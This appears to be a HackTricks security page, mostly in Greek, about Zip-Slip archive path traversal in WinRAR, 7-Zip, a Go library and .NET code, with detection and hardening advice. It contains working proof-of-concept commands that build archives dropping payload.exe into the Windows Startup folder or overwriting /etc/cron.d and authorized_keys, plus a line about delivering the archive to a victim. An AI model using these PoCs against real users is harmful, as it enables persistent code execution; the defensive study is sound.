# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Επισκόπηση

Πολλά archive formats (ZIP, RAR, TAR, 7-ZIP, κ.λπ.) επιτρέπουν σε κάθε εγγραφή να έχει τη δική της **εσωτερική διαδρομή**. Όταν ένα εργαλείο εξαγωγής αποδέχεται τυφλά αυτή τη διαδρομή, ένα κατασκευασμένο όνομα αρχείου που περιέχει `..` ή μια **απόλυτη διαδρομή** (π.χ. `C:\Windows\System32\`) θα γραφτεί έξω από τον κατάλογο που επέλεξε ο χρήστης.
Αυτή η κατηγορία ευπάθειας είναι ευρέως γνωστή ως *Zip-Slip* ή **archive extraction path traversal**.

Οι συνέπειες κυμαίνονται από την αντικατάσταση αυθαίρετων αρχείων μέχρι την άμεση επίτευξη **remote code execution (RCE)** με την τοποθέτηση ενός payload σε μία **auto-run** τοποθεσία, όπως ο φάκελος *Startup* των Windows.

## Βασική αιτία

1. Ο επιτιθέμενος δημιουργεί ένα archive όπου ένα ή περισσότερα headers αρχείων περιέχουν:
* Relative traversal sequences (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Absolute paths (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Or crafted **symlinks** that resolve outside the target dir (common in ZIP/TAR on *nix*).
2. Το θύμα αποσυμπιέζει το archive με ένα ευάλωτο εργαλείο που εμπιστεύεται την ενσωματωμένη διαδρομή (ή ακολουθεί τα symlinks) αντί να την καθαρίσει ή να εξαναγκάσει την εξαγωγή κάτω από τον επιλεγμένο κατάλογο.
3. Το αρχείο γράφεται στην τοποθεσία που ελέγχεται από τον επιτιθέμενο και εκτελείται/φορτώνεται την επόμενη φορά που το σύστημα ή ο χρήστης ενεργοποιεί αυτή τη διαδρομή.

### .NET `Path.Combine` + `ZipArchive` traversal

Ένα κοινό .NET anti-pattern είναι ο συνδυασμός του προοριζόμενου προορισμού με **ελεγχόμενο από τον χρήστη** `ZipArchiveEntry.FullName` και η εξαγωγή χωρίς κανονικοποίηση της διαδρομής:
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- Αν το `entry.FullName` ξεκινά με `..\\` τότε κάνει traversal; αν είναι **absolute path** το αριστερό συστατικό απορρίπτεται εντελώς, οδηγώντας σε **arbitrary file write** ως την extraction identity.
- Proof-of-concept archive για εγγραφή σε έναν sibling `app` directory που παρακολουθείται από έναν scheduled scanner:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
Η τοποθέτηση αυτού του ZIP στο παρακολουθούμενο inbox έχει ως αποτέλεσμα το `C:\samples\app\0xdf.txt`, αποδεικνύοντας traversal εκτός του `C:\samples\queue\` και επιτρέποντας follow-on primitives (π.χ. DLL hijacks).

## Πραγματικό Παράδειγμα – WinRAR ≤ 7.12 (CVE-2025-8088)

Το WinRAR για Windows (συμπεριλαμβανομένων του `rar` / `unrar` CLI, του DLL και του portable source) απέτυχε να επικυρώσει τα ονόματα αρχείων κατά την εξαγωγή.
Ένα κακόβουλο RAR αρχείο που περιέχει μια καταχώρηση όπως:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
θα καταλήξει **εκτός** του επιλεγμένου φακέλου εξόδου και μέσα στο φάκελο *Startup* του χρήστη. Μετά τη σύνδεση, τα Windows εκτελούν αυτόματα οτιδήποτε βρίσκεται εκεί, παρέχοντας *επίμονο* RCE.

### Δημιουργία PoC αρχείου (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Επιλογές που χρησιμοποιήθηκαν:
* `-ep`  – αποθηκεύει τις διαδρομές αρχείων ακριβώς όπως δίνονται (μην **περικόπτετε** το αρχικό `./`).

Παραδώστε το `evil.rar` στο θύμα και δώστε οδηγίες να το αποσυμπιέσει με ευάλωτη έκδοση του WinRAR.

### Παρατηρούμενη εκμετάλλευση στο πεδίο

ESET ανέφερε spear-phishing καμπάνιες RomCom (Storm-0978/UNC2596) που επισύναπταν RAR αρχεία που καταχράζονταν το CVE-2025-8088 για να αναπτύξουν customised backdoors και να διευκολύνουν επιχειρήσεις ransomware.

## Νεότερες Περιπτώσεις (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Σφάλμα**: ZIP entries that are **symbolic links** ακολουθούνταν κατά την εξαγωγή, επιτρέποντας σε επιτιθέμενους να διαφύγουν από τον κατάλογο προορισμού και να αντικαταστήσουν αυθαίρετες διαδρομές. Η αλληλεπίδραση χρήστη είναι απλά το *άνοιγμα/εξαγωγή* του αρχείου.
* **Επηρεασμένα**: 7-Zip 21.02–24.09 (Windows & Linux builds). Fixed in **25.00** (July 2025) and later.
* **Impact path**: Overwrite `Start Menu/Programs/Startup` or service-run locations → code runs at next logon or service restart.
* **Quick PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
On a patched build `/etc/cron.d` won’t be touched; the symlink is extracted as a link inside /tmp/target.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Σφάλμα**: `archiver.Unarchive()` follows `../` and symlinked ZIP entries, writing outside `outputDir`.
* **Επηρεασμένα**: `github.com/mholt/archiver` ≤ 3.5.1 (project now deprecated).
* **Διόρθωση**: Switch to `mholt/archives` ≥ 0.1.0 or implement canonical-path checks before write.
* **Ελάχιστη αναπαραγωγή**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Συμβουλές Ανίχνευσης

* **Στατική επιθεώρηση** – Καταγράψτε τις εγγραφές του αρχείου και επισημάνετε οποιοδήποτε όνομα που περιέχει `../`, `..\\`, *απόλυτες διαδρομές* (`/`, `C:`) ή εγγραφές τύπου *symlink* των οποίων ο προορισμός είναι εκτός του καταλόγου εξαγωγής.
* **Κανικοποίηση** – Βεβαιωθείτε ότι `realpath(join(dest, name))` εξακολουθεί να ξεκινά με `dest`. Απορρίψτε διαφορετικά.
* **Εξαγωγή σε sandbox** – Αποσυμπιέστε σε προσωρινό κατάλογο χρησιμοποιώντας έναν *safe* extractor (π.χ. `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) και επαληθεύστε ότι οι προκύπτουσες διαδρομές παραμένουν εντός του καταλόγου.
* **Παρακολούθηση endpoint** – Ειδοποιήστε για νέα εκτελέσιμα που γράφονται σε `Startup`/`Run`/`cron` τοποθεσίες αμέσως μετά το άνοιγμα ενός αρχείου από WinRAR/7-Zip/etc.

## Μείωση Κινδύνου & Σκληρυνση

1. **Ενημερώστε το εργαλείο εξαγωγής** – WinRAR 7.13+ και 7-Zip 25.00+ υλοποιούν sanitisation για διαδρομές/symlink. Και τα δύο εργαλεία εξακολουθούν να μην διαθέτουν auto-update.
2. Αποσυμπιέζετε αρχεία με “**Do not extract paths**” / “**Ignore paths**” όταν είναι εφικτό.
3. Σε Unix, μειώστε προνόμια και κάντε mount ένα **chroot/namespace** πριν την εξαγωγή· στα Windows, χρησιμοποιήστε **AppContainer** ή sandbox.
4. Αν γράφετε custom κώδικα, κανονικοποιήστε με `realpath()`/`PathCanonicalize()` **πριν** τη δημιουργία/εγγραφή, και απορρίψτε οποιαδήποτε εγγραφή που διαφεύγει από τον προορισμό.

## Επιπλέον Επηρεασμένες / Ιστορικές Περιπτώσεις

* 2018 – Massive *Zip-Slip* advisory by Snyk affecting many Java/Go/JS libraries.
* 2023 – 7-Zip CVE-2023-4011 similar traversal during `-ao` merge.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) TAR extraction traversal in slugs (patch in v1.2).
* Any custom extraction logic that fails to call `PathCanonicalize` / `realpath` prior to write.

## Αναφορές

- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

{{#include ../banners/hacktricks-training.md}}
